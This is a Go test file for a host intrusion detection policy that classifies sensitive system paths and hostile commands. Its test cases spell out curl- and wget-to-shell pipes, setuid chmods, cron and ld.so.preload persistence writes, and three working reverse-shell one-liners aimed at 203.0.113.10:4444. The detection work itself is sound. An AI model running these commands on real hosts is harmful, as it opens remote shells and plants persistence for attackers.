//go:build hids

package policy

import "testing"

func TestIsSensitiveAuditPathCoversPersistenceAndLoginRoots(t *testing.T) {
	t.Parallel()

	for _, path := range []string{
		"/srv/node/etc/pam.d/sshd",
		"/srv/node/etc/security/access.conf",
		"/srv/node/var/spool/cron/root",
		"/srv/node/etc/systemd/system/evil.service",
		"/srv/node/etc/profile.d/evil.sh",
		"/srv/node/etc/ld.so.preload",
	} {
		if !IsSensitiveAuditPath(path) {
			t.Fatalf("expected %q to be treated as sensitive audit path", path)
		}
	}
	if IsSensitiveAuditPath("/srv/node/tmp/demo.txt") {
		t.Fatal("did not expect tmp file to be treated as sensitive audit path")
	}
}

func TestSensitiveAuditSeedPathsExposeStaticBootstrapRoots(t *testing.T) {
	t.Parallel()

	paths := SensitiveAuditSeedPaths()
	required := map[string]bool{
		"/etc/passwd":             false,
		"/etc/ld.so.preload":      false,
		"/etc/profile.d":          false,
		"/etc/pam.d":              false,
		"/var/spool/cron":         false,
		"/etc/systemd/system":     false,
		"/usr/lib/systemd/system": false,
	}
	for _, path := range paths {
		if _, ok := required[path]; ok {
			required[path] = true
		}
	}
	for path, present := range required {
		if !present {
			t.Fatalf("expected %q in sensitive audit seed paths: %#v", path, paths)
		}
	}
}

func TestIsSystemELFArtifactPath(t *testing.T) {
	t.Parallel()

	for _, path := range []string{
		"/usr/bin/ssh",
		"/usr/local/bin/custom-agent",
		"/lib/systemd/systemd",
		"/usr/lib/x86_64-linux-gnu/libssl.so.3",
	} {
		if !IsSystemELFArtifactPath(path) {
			t.Fatalf("expected %q to be treated as system ELF artifact path", path)
		}
	}
	for _, path := range []string{
		"/tmp/payload",
		"/srv/app/bin/service",
		"/home/demo/.local/bin/tool",
	} {
		if IsSystemELFArtifactPath(path) {
			t.Fatalf("did not expect %q to be treated as system ELF artifact path", path)
		}
	}
}

func TestIsDownloadPipeShellCommand(t *testing.T) {
	t.Parallel()

	if !IsDownloadPipeShellCommand("sh -c curl -fsSL https://example.test/install.sh | bash") {
		t.Fatal("expected curl pipe bash to match")
	}
	if !IsDownloadPipeShellCommand("wget -qO- https://example.test/install.sh | /bin/sh") {
		t.Fatal("expected wget pipe sh to match")
	}
	if IsDownloadPipeShellCommand("curl -fsSL https://example.test/payload.bin -o /tmp/payload.bin") {
		t.Fatal("download without shell pipe should not match")
	}
}

func TestIsSetuidSetgidBitCommand(t *testing.T) {
	t.Parallel()

	if !IsSetuidSetgidBitCommand("chmod u+s /tmp/helper") {
		t.Fatal("expected symbolic setuid to match")
	}
	if !IsSetuidSetgidBitCommand("chmod 4755 /tmp/helper") {
		t.Fatal("expected octal setuid to match")
	}
	if IsSetuidSetgidBitCommand("chmod 0755 /usr/local/bin/tool") {
		t.Fatal("regular chmod should not match")
	}
}

func TestIsPersistenceCommand(t *testing.T) {
	t.Parallel()

	if !IsPersistenceCommand("systemctl enable evil.service") {
		t.Fatal("expected systemctl enable to match")
	}
	if !IsPersistenceCommand("sh -c echo '* * * * * root /tmp/x' > /etc/cron.d/x") {
		t.Fatal("expected cron file write to match")
	}
	if !IsPersistenceCommand("sh -c printf '/tmp/lib.so' > /etc/ld.so.preload") {
		t.Fatal("expected ld.so.preload write to match")
	}
	if !IsPersistenceCommand("install -m 0644 evil.sh /etc/profile.d/evil.sh") {
		t.Fatal("expected profile.d install to match")
	}
	if IsPersistenceCommand("systemctl status sshd.service") {
		t.Fatal("read-only systemctl command should not match")
	}
}

func TestIsReverseShellCommand(t *testing.T) {
	t.Parallel()

	if !IsReverseShellCommand("bash -c 'bash -i >& /dev/tcp/203.0.113.10/4444 0>&1'") {
		t.Fatal("expected /dev/tcp reverse shell to match")
	}
	if !IsReverseShellCommand("socat tcp:203.0.113.10:4444 exec:'/bin/sh -li',pty,stderr,setsid,sigint,sane") {
		t.Fatal("expected socat reverse shell to match")
	}
	if !IsReverseShellCommand("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.10 4444 >/tmp/f") {
		t.Fatal("expected mkfifo netcat reverse shell to match")
	}
	if IsReverseShellCommand("curl -fsSL https://example.test/install.sh | bash") {
		t.Fatal("download pipe shell should not be treated as reverse shell")
	}
}

func TestIsAccountManagementCommand(t *testing.T) {
	t.Parallel()

	if !IsAccountManagementCommand("/usr/sbin/useradd -m deploy") {
		t.Fatal("expected useradd to match")
	}
	if !IsAccountManagementCommand("gpasswd -a deploy sudo") {
		t.Fatal("expected gpasswd to match")
	}
	if IsAccountManagementCommand("id deploy") {
		t.Fatal("identity lookup should not match")
	}
}
